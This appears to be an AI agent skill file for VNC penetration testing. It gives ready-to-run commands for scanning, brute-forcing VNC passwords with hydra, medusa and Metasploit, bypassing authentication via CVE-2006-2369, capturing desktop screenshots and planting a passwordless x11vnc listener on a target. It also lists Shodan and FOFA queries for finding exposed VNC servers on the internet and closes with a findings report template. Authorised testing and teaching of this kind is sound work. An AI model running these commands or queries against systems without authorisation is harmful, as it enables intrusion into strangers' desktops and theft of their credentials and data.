---
name: proto-vnc
description: "VNC (Virtual Network Computing) enumeration and exploitation. No-auth check, VNC brute force, CVE-2006-2369 auth bypass, screenshot capture, LibVNCServer CVEs, SSH tunnel access. Triggers: 'vnc', 'rfb protocol', 'vnc exploit', 'vnc brute', 'vnc no auth', 'virtual network computing', 'vnc pentest', 'vnc screenshot', 'vnc vulnerability'."
---

# VNC Penetration Testing

Enumerate → check no-auth → brute force → exploit CVE → capture screenshot.

---

## Phase 1: Discovery & Enumeration

```bash
TARGET_IP="192.168.1.100"

# Port scan (VNC: 5900-5910):
nmap -sV -p 5900-5910 $TARGET_IP

# Full VNC scripts:
nmap -sV --script vnc-info,vnc-brute,vnc-title -p 5900-5910 $TARGET_IP

# Auth type detection:
nmap --script vnc-info -p 5900 $TARGET_IP
# Auth types:
# 0 = None (immediately vulnerable)
# 1 = VNC Password
# 16 = Tight
# 18 = TLS
# 19 = VeNCrypt (TLS-wrapped)

# Service banner:
nmap -sV -p 5900 --version-intensity 9 $TARGET_IP
```

---

## Phase 2: No-Auth Check

```bash
TARGET_IP="192.168.1.100"

# Check for no-auth VNC:
nmap --script vnc-info -p 5900 $TARGET_IP | grep "Security types"
# "None" in Security types = unauthenticated access

# Direct connection (no password):
vncviewer $TARGET_IP:5900

# Screenshot without authentication:
vncsnapshot -passwd /dev/null $TARGET_IP:0 vnc_screenshot.jpg
```

---

## Phase 3: Brute Force

```bash
TARGET_IP="192.168.1.100"

# Hydra:
hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET_IP -t 4
hydra -P /usr/share/wordlists/rockyou.txt -s 5901 vnc://$TARGET_IP -t 4

# Medusa:
medusa -h $TARGET_IP -p 5900 -P /usr/share/wordlists/rockyou.txt -M vnc

# Metasploit:
msfconsole -q -x "
  use auxiliary/scanner/vnc/vnc_login;
  set RHOSTS $TARGET_IP;
  set PASS_FILE /usr/share/wordlists/rockyou.txt;
  run
"

# Common VNC passwords:
COMMON_PASSES=("" "vnc" "password" "123456" "admin" "root" "secret" "letmein")
for pass in "${COMMON_PASSES[@]}"; do
  timeout 3 vncviewer -passwd <(echo "$pass") $TARGET_IP:5900 2>/dev/null \
    && echo "Password found: '$pass'" && break
done
```

---

## Phase 4: CVE Exploitation

```bash
TARGET_IP="192.168.1.100"

# CVE-2006-2369 (RealVNC 4.1.1 Auth Bypass):
# Force auth type None even when VNC Password required
msfconsole -q -x "
  use auxiliary/scanner/vnc/vnc_none_auth;
  set RHOSTS $TARGET_IP;
  run
"

# LibVNCServer vulnerabilities:
searchsploit libvncserver
searchsploit vnc | grep -iE "bypass|overflow|rce"

# CVE-2018-7225 — LibVNCServer info disclosure:
nmap --script vnc-info -p 5900 $TARGET_IP

# CVE-2019-15681 — LibVNCServer heap buffer overflow:
# Update target scanner:
nuclei -t network/cves/ -u $TARGET_IP:5900
```

---

## Phase 5: Screenshot & Access

```bash
TARGET_IP="192.168.1.100"
PASSWORD="discovered_password"

# Screenshot with password:
vncsnapshot -passwd <(echo "$PASSWORD") $TARGET_IP:0 screenshot.jpg

# Interactive connection:
vncviewer $TARGET_IP::5900

# Via SSH tunnel (if SSH also available):
ssh -L 5901:127.0.0.1:5900 user@$TARGET_IP -N -f
vncviewer 127.0.0.1:5901

# x11vnc server (start VNC on target if you have shell):
# On target: x11vnc -display :0 -nopw -listen 0.0.0.0 -port 5900
```

---

## Phase 6: Shodan Discovery

```
# Shodan queries:
port:5900 "RFB 003.008"
product:"VNC"
port:5900 "authentication disabled"

# FOFA:
protocol="rfb"
```

---

## Report Template

```markdown
## VNC Security Assessment

**Port:** 5900/tcp (VNC/RFB)
**Auth Type:** [None | VNC Password | NLA/TLS]

### Findings
| Issue | Severity |
|:------|:--------:|
| No authentication required | Critical |
| Weak VNC password (brute-forced) | High |
| Unencrypted VNC traffic | Medium |
| RealVNC 4.1.1 auth bypass CVE-2006-2369 | Critical |

**Impact:** Full unauthenticated desktop access enables data theft,
credential capture, malware deployment, and lateral movement.

### Recommendations
1. Require strong authentication (NLA or VeNCrypt/TLS)
2. Restrict VNC to localhost — require SSH tunnel for remote access
3. Use strong password (>12 chars, unique)
4. Firewall port 5900 from public internet
5. Update VNC server software to current version
```

---

## Output

Save to `.omop/engagement/proto/vnc/`:
- `screenshot.jpg` — captured desktop screenshot
- `credentials.txt` — discovered credentials
- `enum.txt` — VNC service info

## Next Phase

→ `post-credential-dumping` if desktop accessed
→ `pentest-report` for final report
